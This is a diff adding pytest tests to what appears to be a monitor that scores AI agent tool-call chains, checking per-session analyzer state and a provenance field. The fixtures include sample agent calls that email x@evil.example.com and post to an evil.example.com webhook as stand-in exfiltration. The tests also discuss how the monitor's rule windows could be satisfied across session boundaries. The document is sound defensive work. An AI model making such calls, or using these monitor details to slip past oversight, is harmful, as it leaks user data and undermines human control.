@@ -402,6 +402,55 @@ def test_captured_file_is_readable_by_both_trace_consumers(tmp_path):
     assert len(sequences) == 1 and sequences[0].shape == (4, 20)
 
 
+def test_daemon_scopes_analyzer_state_by_session_id():
+    """Two capture recipes through one daemon are two sessions, not one.
+
+    ``capture_bizops.sh`` starts a single daemon and drives every recipe through
+    it, each with its own ``CHAINWATCH_SESSION``. Until this passed, the daemon
+    held one SessionAnalyzer for its whole lifetime and the session id never
+    crossed the wire at all -- so every recipe of a run shared one k=10 window,
+    one HMM history and one call counter.
+
+    Measured on a two-recipe run: the call index ran 1..5 for the first recipe
+    and *continued* 6..26 for the second. That is B1 one layer down. B1 made the
+    trace ids unique per run, which cannot help here, because the analyzer never
+    saw an id to be unique about. The damage is to exactly the figure route C
+    exists to produce: R2 asks for two distinct servers in the window and R3 for
+    a READ within m steps, and across a recipe boundary both are satisfiable by
+    work that never sat next to itself.
+
+    Sessions still pool across *servers*, which is the daemon's whole purpose
+    (dim 9, rule R2). Only the session boundary is a boundary.
+    """
+    from chainwatch.daemon.server import SessionState
+
+    state = SessionState()
+
+    def submit(session: str, tool: str, n: int) -> dict:
+        return state.handle(
+            {
+                "op": "submit",
+                "key": f"{session}-{n}",
+                "session": session,
+                "server": "banking",
+                "tool": tool,
+                "arguments": {},
+                "timestamp": 1000.0 + n,
+            }
+        )["verdict"]
+
+    for n, tool in enumerate(["get_balance", "list_payees", "get_scheduled_transactions"]):
+        submit("bizops-run-001", tool, n)
+
+    first_of_second_recipe = submit("bizops-run-002", "search_emails", 0)
+
+    assert first_of_second_recipe["call_index"] == 0, (
+        "a new session must start its own call counter, not continue the last one"
+    )
+    assert state.handle({"op": "ping", "session": "bizops-run-002"})["calls"] == 1
+    assert state.handle({"op": "ping", "session": "bizops-run-001"})["calls"] == 3
+
+
 def test_daemon_wire_form_preserves_the_feature_vector():
     """A daemon-backed proxy is the normal multi-server deployment; without the vector
     on the wire every line it captured would carry ``v: null``."""
@@ -529,3 +578,41 @@ def test_end_to_end_unparseable_input_is_forwarded_not_dropped():
     )
     replies = [json.loads(l) for l in process.stdout.splitlines() if l.strip()]
     assert len(replies) == 1 and replies[0]["id"] == 1
+
+
+def test_trace_line_carries_destination_provenance(tmp_path):
+    """The corpus must record provenance, or a rerun cannot re-score it offline.
+
+    Also pins the negative: provenance is a *sidecar*, not a 21st dimension. If it
+    ever leaks into the vector, every trained model and every captured trace
+    silently disagrees with the section IV-B contract.
+    """
+    from chainwatch.engine.features import ObservedCall
+    from chainwatch.engine.session import SessionAnalyzer
+
+    analyzer = SessionAnalyzer()
+    call = ObservedCall("send_email", {"to": "x@evil.example.com"}, "s", 1000.0)
+    _, verdict = analyzer.process(call, '{"sent": true}')
+
+    log = AuditLog(directory=tmp_path)
+    log.record(
+        "s", "send_email", call.arguments, verdict,
+        vector=verdict.vector, session="t", label="benign", source="test", call=1,
+    )
+
+    line = json.loads(next(tmp_path.glob("*.jsonl")).read_text().splitlines()[0])
+    assert line["prov"] == "UNATTESTED"
+    assert len(line["v"]) == 20, "provenance must not have become a feature dimension"
+
+
+def test_daemon_wire_form_carries_provenance():
+    """Daemon-backed capture is the multi-server deployment; the field must survive
+    the socket, or route C's traces lose exactly the column they were captured for."""
+    from chainwatch.daemon.server import verdict_to_dict
+    from chainwatch.engine.features import ObservedCall
+    from chainwatch.engine.session import SessionAnalyzer
+
+    analyzer = SessionAnalyzer()
+    call = ObservedCall("post_to_webhook", {"url": "https://evil.example.com/c"}, "s", 1000.0)
+    verdict = analyzer.submit(call)
+    assert verdict_to_dict(verdict)["provenance"] == "UNATTESTED"
